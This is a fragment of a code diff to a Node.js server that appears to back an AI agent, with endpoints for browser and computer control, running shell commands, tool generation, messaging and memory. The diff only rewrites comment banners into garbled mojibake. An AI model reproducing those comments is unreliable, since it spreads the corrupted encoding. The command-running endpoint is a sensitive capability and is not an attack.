+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // BROWSER CONTROL ENDPOINTS
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/browser/open â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/open Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/open') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1649,7 +1709,7 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.openUrl(body.url));
     }
 
-    // â•â•â• POST /api/browser/screenshot â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/screenshot Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/screenshot') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1657,7 +1717,7 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.screenshot(body.outputPath));
     }
 
-    // â•â•â• POST /api/browser/keys â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/keys Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/keys') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1666,7 +1726,7 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.sendKeys(body.keys));
     }
 
-    // â•â•â• POST /api/browser/click â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/click Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/click') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1675,14 +1735,14 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.mouseClick(body.x, body.y));
     }
 
-    // â•â•â• GET /api/browser/windows â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/browser/windows Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/browser/windows') {
       const bc = refs.browserControl;
       if (!bc) return json(res, 500, { error: 'Browser control not available' });
       return json(res, 200, bc.listWindows());
     }
 
-    // â•â•â• POST /api/browser/focus â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/focus Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/focus') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1691,7 +1751,7 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.focusWindow(body.title));
     }
 
-    // â•â•â• POST /api/browser/type â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/browser/type Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/browser/type') {
       const body = JSON.parse(await readBody(req));
       const bc = refs.browserControl;
@@ -1700,11 +1760,11 @@ async function handleRequest(req, res) {
       return json(res, 200, bc.typeText(body.text));
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // COMPUTER CONTROL ENDPOINTS
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/computer/run â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/computer/run Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/computer/run') {
       const body = JSON.parse(await readBody(req));
       const cc = refs.computerControl;
@@ -1713,14 +1773,14 @@ async function handleRequest(req, res) {
       return json(res, 200, cc.runCommand(body.cmd));
     }
 
-    // â•â•â• GET /api/computer/processes â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/computer/processes Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/computer/processes') {
       const cc = refs.computerControl;
       if (!cc) return json(res, 500, { error: 'Computer control not available' });
       return json(res, 200, cc.listProcesses());
     }
 
-    // â•â•â• POST /api/computer/kill â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/computer/kill Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/computer/kill') {
       const body = JSON.parse(await readBody(req));
       const cc = refs.computerControl;
@@ -1729,14 +1789,14 @@ async function handleRequest(req, res) {
       return json(res, 200, cc.killProcess(body.name));
     }
 
-    // â•â•â• GET /api/computer/clipboard â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/computer/clipboard Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/computer/clipboard') {
       const cc = refs.computerControl;
       if (!cc) return json(res, 500, { error: 'Computer control not available' });
       return json(res, 200, cc.getClipboard());
     }
 
-    // â•â•â• POST /api/computer/clipboard â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/computer/clipboard Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/computer/clipboard') {
       const body = JSON.parse(await readBody(req));
       const cc = refs.computerControl;
@@ -1745,14 +1805,14 @@ async function handleRequest(req, res) {
       return json(res, 200, cc.setClipboard(body.text));
     }
 
-    // â•â•â• GET /api/computer/sysinfo â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/computer/sysinfo Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/computer/sysinfo') {
       const cc = refs.computerControl;
       if (!cc) return json(res, 500, { error: 'Computer control not available' });
       return json(res, 200, cc.getSystemInfo());
     }
 
-    // â•â•â• POST /api/computer/open â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/computer/open Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/computer/open') {
       const body = JSON.parse(await readBody(req));
       const cc = refs.computerControl;
@@ -1761,46 +1821,46 @@ async function handleRequest(req, res) {
       return json(res, 200, cc.openApp(body.appName));
     }
 
-    // â•â•â• GET /api/computer/network â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/computer/network Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/computer/network') {
       const cc = refs.computerControl;
       if (!cc) return json(res, 500, { error: 'Computer control not available' });
       return json(res, 200, cc.getNetworkInfo());
     }
 
-    // â•â•â• GET /api/computer/services â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/computer/services Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/computer/services') {
       const cc = refs.computerControl;
       if (!cc) return json(res, 500, { error: 'Computer control not available' });
       return json(res, 200, cc.listServices());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v4.3 MODULES â€" Enhanced Self-Evolve, Tool Generator, Web Intelligence
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v4.3 MODULES Ã¢â‚¬" Enhanced Self-Evolve, Tool Generator, Web Intelligence
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/evolve/research â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/evolve/research Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/evolve/research') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       try { return json(res, 200, await evolve.research()); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/evolve/research â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/research Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/research') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       return json(res, 200, evolve.getResearch());
     }
 
-    // â•â•â• POST /api/evolve/discover â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/evolve/discover Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/evolve/discover') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       try { return json(res, 200, await evolve.discoverTools()); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/evolve/implement â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/evolve/implement Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/evolve/implement') {
       const body = JSON.parse(await readBody(req));
       const evolve = refs.selfEvolve;
@@ -1809,14 +1869,14 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await evolve.implementSuggestion(body.suggestionId)); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/evolve/competitive â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/competitive Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/competitive') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       try { return json(res, 200, await evolve.getCompetitiveAnalysis()); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/tools/generate â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/tools/generate Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/tools/generate') {
       const body = JSON.parse(await readBody(req));
       const tg = refs.toolGenerator;
@@ -1825,14 +1885,14 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await tg.generateTool(body.description)); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/tools/custom â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/tools/custom Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/tools/custom') {
       const tg = refs.toolGenerator;
       if (!tg) return json(res, 500, { error: 'Tool generator not available' });
       return json(res, 200, { tools: tg.listCustomTools() });
     }
 
-    // â•â•â• POST /api/tools/install â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/tools/install Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/tools/install') {
       const body = JSON.parse(await readBody(req));
       const tg = refs.toolGenerator;
@@ -1840,7 +1900,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, tg.installTool(body)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• DELETE /api/tools/custom/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/tools/custom/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/tools/custom/')) {
       const id = reqPath.split('/').pop();
       const tg = refs.toolGenerator;
@@ -1848,7 +1908,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, tg.removeTool(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/tools/test/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/tools/test/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/tools/test/')) {
       const id = reqPath.split('/').pop();
       const tg = refs.toolGenerator;
@@ -1856,7 +1916,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, tg.testTool(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/web-intel/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/web-intel/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/web-intel/search') {
       const body = JSON.parse(await readBody(req));
       const wi = refs.webIntelligence;
@@ -1865,7 +1925,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, { results: await wi.searchWeb(body.query) }); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/web-intel/research â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/web-intel/research Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/web-intel/research') {
       const body = JSON.parse(await readBody(req));
       const wi = refs.webIntelligence;
@@ -1874,18 +1934,18 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await wi.researchTopic(body.topic)); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/web-intel/cache â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/web-intel/cache Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/web-intel/cache') {
       const wi = refs.webIntelligence;
       if (!wi) return json(res, 500, { error: 'Web intelligence not available' });
       return json(res, 200, wi.getCache());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v4.4 MODULES â€" Messaging, Memory, Nodes, Scheduler, Search, Skills, Daemon
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v4.4 MODULES Ã¢â‚¬" Messaging, Memory, Nodes, Scheduler, Search, Skills, Daemon
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/messages/send â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/messages/send Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/messages/send') {
       const body = JSON.parse(await readBody(req));
       const hub = refs.messagingHub;
@@ -1896,7 +1956,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/messages/broadcast â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/messages/broadcast Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/messages/broadcast') {
       const body = JSON.parse(await readBody(req));
       const hub = refs.messagingHub;
@@ -1907,7 +1967,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/messages/inbox â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/messages/inbox Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/messages/inbox') {
       const hub = refs.messagingHub;
       if (!hub) return json(res, 500, { error: 'Messaging not available' });
@@ -1916,7 +1976,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { messages: hub.getInbox(channel, limit), status: hub.getStatus() });
     }
 
-    // â•â•â• GET /api/messages/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/messages/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/messages/history') {
       const hub = refs.messagingHub;
       if (!hub) return json(res, 500, { error: 'Messaging not available' });
@@ -1925,14 +1985,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { messages: hub.getHistory(channel, limit) });
     }
 
-    // â•â•â• GET /api/memory/today â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory/today Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory/today') {
       const pm = refs.persistentMemory;
       if (!pm) return json(res, 500, { error: 'Persistent memory not available' });
       return json(res, 200, { content: pm.getToday(), stats: pm.getStats() });
     }
 
-    // â•â•â• GET /api/memory/recent â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory/recent Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory/recent') {
       const pm = refs.persistentMemory;
       if (!pm) return json(res, 500, { error: 'Persistent memory not available' });
@@ -1940,7 +2000,7 @@ async function handleRequest(req, res) {
